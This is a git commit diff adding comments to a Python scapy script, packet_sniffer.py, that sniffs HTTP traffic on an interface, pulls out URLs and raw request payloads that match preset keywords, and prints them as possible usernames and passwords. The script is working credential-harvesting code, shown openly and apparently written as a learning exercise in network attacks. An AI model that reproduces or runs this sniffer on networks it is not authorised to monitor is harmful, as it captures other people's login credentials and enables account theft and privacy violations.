28c5352bb01bdfd98da1e03d86c2b6a9afe9621c
Corvus0x02 <Corvus0x02@protonmail.com>
2022-10-31 20:07:44 -0400

    Added comments to script

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,20 +1,24 @@
 #!/usr/bin/env python3
+#Python3 script for sniffing packets for pre-defined keywords
 
+#Imports
 import scapy.all as scapy
 from scapy.layers.http import *
 
-#store specifies where scapy should store this sniffed information. Defaults to in-memory
-#prn specifies a function to run with each packet sniffed
+#Store specifies where scapy should store this sniffed information. Defaults to in-memory
+#prn specifies the function to run with each packet sniffed
 #filter can be udp, tcp, arp, etc. Ports with "port 21", "port 22", etc.
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+#Function to get and return the url of a packet
 def get_url(packet):
     host = packet[HTTPRequest].Host
     path = packet[HTTPRequest].Path
     url = host + path
     return url
 
+#Function to only return specified keywords in a packet
 def get_login_info(packet):
     if packet.haslayer(Raw):
         load = packet[Raw].load.decode()
@@ -23,6 +27,7 @@ def get_login_info(packet):
             if keyword in load:
                 return load
 
+#Function to process the sniff packet
 def process_sniffed_packet(packet):
     #Sniff for HTTP POST Requests
     if packet.haslayer(HTTPRequest):
@@ -33,4 +38,5 @@ def process_sniffed_packet(packet):
             print("[+] Possible Username/Password >", login_info, "\n")
     #Sniff for Cookies in HTTP Responses
     #if packet.haslayer(HTTPResponse):
+#Interface to sniff
 sniff("eth0")
